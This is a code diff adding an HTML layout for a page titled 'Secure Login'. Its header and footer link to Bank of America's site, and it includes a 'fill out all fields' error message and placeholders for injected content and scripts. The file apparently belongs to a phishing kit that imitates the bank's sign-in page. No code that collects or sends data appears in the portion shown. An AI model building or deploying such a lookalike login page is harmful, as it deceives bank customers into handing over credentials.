@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en" style="background-image: url('/img/bg.jpg');">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/jquery.mask.min.js"></script>
+</head>
+
+<body>
+  <a href="https://secure.bankofamerica.com/">
+    <header></header>
+  </a>
+
+  <main class="col-small-up">
+    <div class="main-section flex-grid-nest">
+      <div class="cb-container">
+        <div class="row cb-collapse">
+          <div class="columns">
+            <div class="cb-login-module">
+              <div class="row">
+                <div class="column col-small errMsg" style="font:16px 'cb-regular';display: none;" >
+                  <div class="cb-message error medium" tabindex="0">
+                    <div class="cb-message-icon">
+                      <span class="data-icon">
+                        <svg role="img" aria-hidden="true" focusable="false" viewBox="0 0 40 41" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                          <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                            <g id="red_ico" transform="translate(-1.000000, 0.000000)" fill-rule="nonzero">
+                              <g id="Path_Clipping_Path" fill="#D82027">
+                                <path d="M40.52,34.9 L24.66,3.35 C24.0205199,1.89971197 22.5850142,0.963815355 21,0.963815355 C19.4149858,0.963815355 17.9794801,1.89971197 17.34,3.35 L1.48,34.89 C0.780648378,36.1939013 0.828414331,37.7715265 1.60536938,39.0307295 C2.38232443,40.2899325 3.77093507,41.040228 5.25,41 L36.75,41 C38.2260948,41.0382165 39.6113234,40.2892339 40.3876113,39.0331712 C41.1638992,37.7771086 41.2143138,36.2031672 40.52,34.9 Z" id="Shape"></path>
+                              </g>
+                              <g id="Path" transform="translate(16.000000, 29.000000)" fill="#FFFFFF">
+                                <circle id="Oval" cx="5" cy="4.31" r="4.1"></circle>
+                              </g>
+                              <g id="Path-2" transform="translate(17.000000, 9.000000)" fill="#FFFFFF">
+                                <path d="M4,0.72 C2.29896297,0.72 0.92,2.09896297 0.92,3.8 L0.92,15.08 C1.01300469,16.7102378 2.36211143,17.984572 3.995,17.984572 C5.62788857,17.984572 6.97699531,16.7102378 7.07,15.08 L7.07,3.8 C7.07000895,2.10286057 5.69713048,0.725510193 4,0.72 Z" id="Shape"></path>
+                              </g>
+                            </g>
+                          </g>
+                        </svg>
+                      </span>
+                    </div>
+                    <div class="cb-message-content">
+                      <p class="cb-message-text">Please fill out all fields to continue.</p>
+                    </div>
+                    <div class="cb-message-dismiss">
+                      <span class="cb-message-close-x">
+                        <span aria-hidden="true">×</span>
+                        <span class="cb-hidden">close: error Message</span>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+                
+                @!section('content')
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <a href="https://secure.bankofamerica.com/">
+    <footer></footer>
+  </a>
+
+  <script src="/js/main.js"></script>
+  @!section('script')
+</body>
+
+</html>
